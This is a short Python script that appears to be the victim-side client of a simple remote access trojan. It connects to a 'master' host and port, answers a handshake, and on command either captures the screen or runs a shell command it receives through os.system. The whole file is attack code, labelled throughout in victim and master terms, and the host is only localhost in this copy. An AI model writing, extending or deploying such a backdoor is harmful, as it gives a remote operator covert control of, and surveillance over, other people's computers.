import socket
from  PIL import ImageGrab
import os

MASTER_HOST = '127.0.0.1'
MASTER_PORT = 8080
BUFFER_SIZE = 4096
HASH = 'utf-8'

def take_screenshot(filename, socket):
    screenshot = ImageGrab.grab()
    screenshot.save(filename)
    screenshot.close()
    socket.send(filename.encode(HASH))

def cmd_control(command):
    os.system(command)

def main():
    with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as victim_socket:
        victim_socket.connect((MASTER_HOST, MASTER_PORT))
        print("master found!")
        if victim_socket.recv(BUFFER_SIZE).decode(HASH) == "connected?":
            print("MASTER: connected?")
            victim_socket.send("YES!".encode(HASH))
            print("VICTIM: YES!")
        else:
            victim_socket.send("NO".encode(HASH))
            print("VICTIM: NO")
            return
        remote_command = victim_socket.recv(BUFFER_SIZE).decode(HASH)
        if remote_command == "screenshot":
            take_screenshot("test.png", victim_socket)
            print("screenshot was taken...")
        elif remote_command == "cmd":
            print("master using cmd...")
            victim_socket.send("victim's cmd is ready to get the command...".encode(HASH))
            cmd_control(victim_socket.recv(BUFFER_SIZE).decode(HASH))
            take_screenshot("cmd.png",victim_socket)
            
if __name__ == '__main__':
    main()